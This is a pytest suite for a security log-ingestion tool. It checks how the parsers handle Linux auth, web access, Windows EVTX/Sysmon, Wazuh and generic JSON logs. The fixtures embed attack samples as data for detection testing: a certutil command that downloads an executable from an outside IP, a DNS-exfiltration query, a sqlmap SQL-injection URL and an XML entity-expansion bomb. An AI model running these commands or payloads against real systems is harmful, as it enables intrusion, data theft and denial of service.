"""Parser and normalisation tests against realistic fixtures for every source."""

import io
from datetime import UTC, datetime
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest

from app.ingest.dedup import DedupKeyer
from app.ingest.parsers import dispatch, windows
from app.ingest.readers import iter_json_array, iter_json_stream, iter_lines
from app.ingest.sniff import SniffError, compatible, sniff
from app.ingest.timeparse import resolve_syslog_year
from app.ingest.types import NormalizedEvent, ParseContext, Parsed, Unparsed
from app.storage.models import Outcome

FIX = Path(__file__).parent / "fixtures" / "ingest"
NOW = datetime(2026, 10, 21, 0, 0, tzinfo=UTC)


def ctx(**kw: object) -> ParseContext:
    base: dict[str, object] = {"syslog_tz": ZoneInfo("UTC"), "syslog_year": None, "now": NOW}
    base.update(kw)
    return ParseContext(**base)  # type: ignore[arg-type]


def run(fmt: str, name: str, **kw: object) -> tuple[list[NormalizedEvent], list[Unparsed]]:
    results = list(dispatch.parse_file(fmt, FIX / name, ctx(**kw)))  # type: ignore[arg-type]
    return (
        [r.event for r in results if isinstance(r, Parsed)],
        [r for r in results if isinstance(r, Unparsed)],
    )


# ----------------------------------------------------------------- sniffing


@pytest.mark.parametrize(
    ("name", "fmt"),
    [
        ("auth.log", "linux_auth"),
        ("auth_rfc3339.log", "linux_auth"),
        ("access.log", "web_access"),
        ("wazuh_alerts.json", "wazuh"),
        ("windows_evtx_dump.jsonl", "windows_json"),
        ("windows_powershell.json", "windows_json"),
        ("generic.jsonl", "generic_jsonl"),
    ],
)
def test_sniff_by_content(name: str, fmt: str) -> None:
    assert sniff((FIX / name).read_bytes()[:65536]) == fmt


def test_sniff_evtx_magic() -> None:
    assert sniff(b"ElfFile\x00" + b"\x00" * 100) == "evtx"


@pytest.mark.parametrize(
    "head",
    [
        b"PK\x03\x04rest-of-zip",
        b"MZ\x90\x00",
        b"\x7fELF\x02\x01",
        b"%PDF-1.7",
        b"hello\x00\x00binary",
        b"",
        b"just some prose\nthat is not a log\n",
    ],
)
def test_sniff_rejects_non_logs(head: bytes) -> None:
    with pytest.raises(SniffError):
        sniff(head)


def test_renamed_extension_does_not_matter() -> None:
    # A zip renamed to auth.log is still a zip.
    with pytest.raises(SniffError, match="zip"):
        sniff(b"PK\x03\x04" + (FIX / "auth.log").read_bytes())


def test_explicit_format_must_match_content() -> None:
    assert compatible("generic_jsonl", "wazuh")
    assert not compatible("linux_auth", "evtx")
    assert not compatible("wazuh", "web_access")


# ----------------------------------------------------------------- linux auth


def test_linux_auth_actions_and_unparsed_bucket() -> None:
    events, unparsed = run("linux_auth", "auth.log")
    assert len(events) == 15
    assert [u.reason for u in unparsed] == ["not a syslog line"]
    assert unparsed[0].raw == "this line is not syslog at all"
    assert unparsed[0].line_no == 16

    by_action: dict[str | None, list[NormalizedEvent]] = {}
    for e in events:
        by_action.setdefault(e.action, []).append(e)

    fails = [e for e in by_action["ssh_login"] if e.outcome == Outcome.failure]
    assert len(fails) == 3  # invalid-user line is its own action, not a 4th failure
    assert fails[0].user == "oracle"
    assert fails[0].extra["invalid_user"] is True
    assert {e.src_ip for e in fails} == {"203.0.113.50"}

    ok = next(e for e in by_action["ssh_login"] if e.outcome == Outcome.success)
    assert (ok.user, ok.src_port, ok.host) == ("deploy", 50310, "web01")

    sudo = by_action["sudo_command"]
    assert sudo[0].process_cmdline == "/usr/sbin/useradd -m -s /bin/bash svc-backup"
    assert sudo[0].extra["target_user"] == "root"
    assert sudo[1].outcome == Outcome.failure
    assert sudo[1].user == "alice"

    assert by_action["user_created"][0].user == "svc-backup"
    added = by_action["group_member_added"]
    assert {e.extra["group"] for e in added} == {"sudo"}
    assert "privileged_group" in added[0].tags
    assert by_action["su"][0].outcome == Outcome.failure
    assert by_action[None][0].extra["message"].startswith("New session 7")


def test_raw_is_preserved_exactly() -> None:
    events, _ = run("linux_auth", "auth.log")
    lines = (FIX / "auth.log").read_text().splitlines()
    assert [e.raw for e in events] == lines[:15]


def test_syslog_timezone_assumption_applies() -> None:
    events, _ = run("linux_auth", "auth.log", syslog_tz=ZoneInfo("Africa/Johannesburg"))
    # 03:14:07 SAST (UTC+2) → 01:14:07 UTC
    assert events[0].timestamp == datetime(2026, 10, 20, 1, 14, 7, tzinfo=UTC)


def test_syslog_explicit_year() -> None:
    events, _ = run("linux_auth", "auth.log", syslog_year=2024)
    assert events[0].timestamp.year == 2024


def test_syslog_year_rolls_back_for_future_dates() -> None:
    jan = datetime(2027, 1, 2, tzinfo=UTC)
    assert resolve_syslog_year(12, 31, jan, None) == 2026
    assert resolve_syslog_year(1, 1, jan, None) == 2027


def test_rfc3339_syslog_carries_its_own_zone() -> None:
    events, unparsed = run("linux_auth", "auth_rfc3339.log", syslog_tz=ZoneInfo("Asia/Tokyo"))
    assert not unparsed
    assert events[0].timestamp == datetime(2026, 10, 20, 7, 0, 1, 123456, tzinfo=UTC)
    assert events[1].action == "group_member_added"
    assert events[1].extra["subject_user"] == "root"
    assert "privileged_group" in events[1].tags


# ----------------------------------------------------------------- web access


def test_web_access() -> None:
    events, unparsed = run("web_access", "access.log", default_host="Web01.corp.local")
    assert len(events) == 5
    assert len(unparsed) == 1
    first, sqli, traversal, tls, head = events
    assert first.host == "web01"
    assert first.extra["host_fqdn"] == "web01.corp.local"
    assert first.outcome == Outcome.success
    assert first.http_status == 200
    assert sqli.url == "/products.php?id=1%27%20OR%201=1--"
    assert sqli.user_agent is not None
    assert sqli.user_agent.startswith("sqlmap/")
    assert sqli.outcome == Outcome.failure
    assert traversal.user == "admin"
    assert traversal.user_agent == 'Mozilla/5.0 "quoted" agent'
    assert traversal.timestamp == datetime(2026, 10, 20, 8, 0, 2, tzinfo=UTC)
    assert tls.url is None
    assert "malformed_request" in tls.tags
    assert head.extra.get("bytes") is None
    assert head.user_agent is None


# ----------------------------------------------------------------- windows


SYSMON_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>
<Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
<EventID>22</EventID><TimeCreated SystemTime="2026-10-20 14:00:00.123456"/>
<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WS-07.corp.local</Computer>
</System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2026-10-20 14:00:00.123</Data>
<Data Name="ProcessId">5120</Data><Data Name="QueryName">aGVsbG8gd29ybGQ.x1.exfil-example.net.</Data>
<Data Name="QueryStatus">0</Data><Data Name="QueryResults">type: 5 ...</Data>
<Data Name="Image">C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd.exe</Data><Data Name="User">CORP\\jdoe</Data>
</EventData></Event>"""

SECURITY_4688_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>
<Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID>
<TimeCreated SystemTime="2026-10-20T14:01:00.0000000Z"/><Computer>WS-07</Computer></System>
<EventData><Data Name="SubjectUserName">jdoe</Data><Data Name="SubjectDomainName">CORP</Data>
<Data Name="NewProcessName">C:\\Windows\\System32\\certutil.exe</Data>
<Data Name="CommandLine">certutil.exe -urlcache -split -f http://203.0.113.80/a.txt a.exe</Data>
<Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data></EventData></Event>"""


def test_evtx_record_xml_sysmon_dns() -> None:
    ev = windows.map_xml(SYSMON_XML)
    assert ev.source_type == "sysmon"
    assert ev.event_code == "22"
    assert ev.action == "dns_query"
    assert ev.dns_query == "agvsbg8gd29ybgq.x1.exfil-example.net"
    assert ev.process_name == "upd.exe"
    assert (ev.user, ev.extra["user_domain"]) == ("jdoe", "CORP")
    assert ev.host == "ws-07"
    assert ev.timestamp == datetime(2026, 10, 20, 14, 0, 0, 123456, tzinfo=UTC)


def test_evtx_record_xml_4688() -> None:
    ev = windows.map_xml(SECURITY_4688_XML)
    assert ev.source_type == "windows_security"
    assert (ev.process_name, ev.parent_process) == ("certutil.exe", "cmd.exe")
    assert ev.process_cmdline is not None
    assert "-urlcache" in ev.process_cmdline


def test_xml_entity_expansion_is_refused() -> None:
    bomb = (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;">]><Event>&lol2;</Event>'
    )
    with pytest.raises(Exception, match=r"(?i)entit"):
        windows.map_xml(bomb)


def test_evtx_dump_json() -> None:
    events, unparsed = run("windows_json", "windows_evtx_dump.jsonl")
    assert not unparsed
    fail, cleared = events
    assert fail.action == "logon"
    assert fail.outcome == Outcome.failure
    assert (fail.user, fail.src_ip) == ("administrator", "203.0.113.77")
    assert fail.extra["logon_type"] == 10
    assert "rdp" in fail.tags
    assert fail.src_port == 0
    assert cleared.action == "log_cleared"
    assert cleared.user == "jdoe"
    assert cleared.timestamp == datetime(2026, 10, 20, 13, 10, tzinfo=UTC)


def test_powershell_utf16_array_with_positional_properties() -> None:
    events, unparsed = run("windows_json", "windows_powershell.json")
    assert [e.event_code for e in events] == ["4720", "4732", "9999"]
    created, added, other = events
    assert created.user == "helpdesk2"
    assert created.extra["subject_user"] == "jdoe"
    assert created.timestamp == datetime(2026, 10, 20, 13, 0, tzinfo=UTC)  # /Date(ms)/
    assert added.extra["group"] == "Administrators"
    assert "privileged_group" in added.tags
    assert added.user is None
    assert added.extra["member_sid"] == "S-1-5-21-9-1005"
    assert other.action == "windows_event"
    assert other.extra["event_data"] == {
        "Data0": "a",
        "Data1": "b",
    }
    assert len(unparsed) == 1
    assert "expected at least 20" in unparsed[0].reason


# ----------------------------------------------------------------- wazuh


def test_wazuh_alerts_keep_underlying_source_type() -> None:
    events, unparsed = run("wazuh", "wazuh_alerts.json")
    assert len(unparsed) == 1
    assert "no rule object" in unparsed[0].reason
    ssh, sysmon, web = events

    assert ssh.source_type == "linux_auth"
    assert ssh.action == "ssh_login"
    assert ssh.outcome == Outcome.failure
    assert ssh.src_ip == "203.0.113.9"
    assert ssh.timestamp == datetime(2026, 10, 20, 12, 0, 0, 123000, tzinfo=UTC)
    assert ssh.extra["wazuh"]["severity"] == "medium"
    assert ssh.extra["wazuh"]["mitre_ids"] == ["T1110.001"]
    assert "wazuh" in ssh.tags

    assert sysmon.source_type == "sysmon"
    assert sysmon.event_code == "1"
    assert sysmon.process_name == "powershell.exe"
    assert sysmon.parent_process == "winword.exe"
    assert sysmon.user == "jdoe"
    assert sysmon.extra["user_domain"] == "CORP"
    assert sysmon.extra["wazuh"]["severity"] == "critical"

    assert web.source_type == "wazuh"
    assert web.src_ip == "198.51.100.4"
    assert web.extra["wazuh"]["severity"] == "low"


# ----------------------------------------------------------------- generic


def test_generic_jsonl_mapping() -> None:
    mapping = {
        "timestamp": "ts",
        "host": "device.name",
        "src_ip": "src",
        "dst_ip": "dst",
        "dst_port": "dport",
        "outcome": "result",
        "user": "who",
    }
    events, unparsed = run("generic_jsonl", "generic.jsonl", field_mapping=mapping)
    assert len(events) == 2
    a, b = events
    assert (a.host, a.dst_port, a.outcome, a.user) == ("fw01", 53, Outcome.success, "carol")
    assert b.timestamp == datetime.fromtimestamp(1792494000, UTC)
    assert b.outcome == Outcome.failure
    reasons = sorted(u.reason for u in unparsed)
    assert reasons[0].startswith("invalid JSON")
    assert "timestamp path" in reasons[1]


# ----------------------------------------------------------------- readers & dedup


def test_json_array_splitter_handles_strings_and_nesting() -> None:
    text = '[ {"a": "x,]}\\"y", "b": [1, {"c": 2}]}, 3, "s", {"d": null} ]'
    recs = list(iter_json_array([text[:7], text[7:20], text[20:]]))
    assert [r.obj for r in recs] == [{"a": 'x,]}"y', "b": [1, {"c": 2}]}, 3, "s", {"d": None}]


def test_json_stream_truncated_array() -> None:
    recs = list(iter_json_stream(io.BytesIO(b'[{"a": 1}, {"b": ')))
    assert recs[0].obj == {"a": 1}
    assert recs[1].error == "truncated JSON array"


def test_lines_survive_bad_bytes_and_crlf() -> None:
    lines = list(iter_lines(io.BytesIO(b"one\r\ntwo \xff\xfe bytes\r\n\r\nthree")))
    assert lines == [(1, "one"), (2, "two \ufffd\ufffd bytes"), (4, "three")]


def test_dedup_keeps_repeats_within_a_batch_but_not_across_uploads() -> None:
    first, second = DedupKeyer(), DedupKeyer()
    line = "Oct 20 03:14:09 web01 sshd[2213]: Failed password for root"
    k1 = [first.key("linux_auth", line) for _ in range(3)]
    k2 = [second.key("linux_auth", line) for _ in range(3)]
    assert len(set(k1)) == 3  # genuine repeats are distinct events
    assert k1 == k2  # same file again → same keys → deduplicated
    assert first.key("web_access", line) != k1[0]


# ----------------------------------------------------------------- real EVTX files

EVTX = FIX / "evtx"


def test_real_evtx_security_sample() -> None:
    results = list(windows.parse_evtx(EVTX / "Security_short_selected.evtx"))
    assert len(results) == 7
    assert all(isinstance(r, Parsed) for r in results)
    events = [r.event for r in results if isinstance(r, Parsed)]
    [fail] = [e for e in events if e.event_code == "4625"]
    assert (fail.action, fail.outcome, fail.user) == ("logon", Outcome.failure, "administrator")
    assert fail.src_ip == "23.94.153.202"
    assert fail.timestamp.tzinfo is not None


def test_real_evtx_account_management() -> None:
    events = [
        r.event
        for r in windows.parse_evtx(EVTX / "new-user-security.evtx")
        if isinstance(r, Parsed)
    ]
    codes = sorted(e.event_code or "" for e in events)
    assert codes == ["4720", "4728", "4732", "4732"]
    created = next(e for e in events if e.event_code == "4720")
    assert created.user == "ieuser"
    assert created.extra["target_sid"].endswith("-1000")
    groups = {e.extra["group"] for e in events if e.action == "group_member_added"}
    assert groups == {"None", "Users", "Administrators"}  # "None" is a real Windows group
    admins = next(e for e in events if e.extra.get("group") == "Administrators")
    assert "privileged_group" in admins.tags
    assert admins.extra["member_sid"] == created.extra["target_sid"]


def test_real_evtx_sysmon_sample() -> None:
    events = [r.event for r in windows.parse_evtx(EVTX / "sysmon.evtx") if isinstance(r, Parsed)]
    assert len(events) == 41
    procs = [e for e in events if e.action == "process_created"]
    assert len(procs) == 31
    assert all(e.source_type == "sysmon" and e.process_name for e in procs)
    assert any(e.parent_process for e in procs)


def test_evtx_upload_sniffs_by_magic() -> None:
    assert sniff((EVTX / "sysmon.evtx").read_bytes()[:65536]) == "evtx"
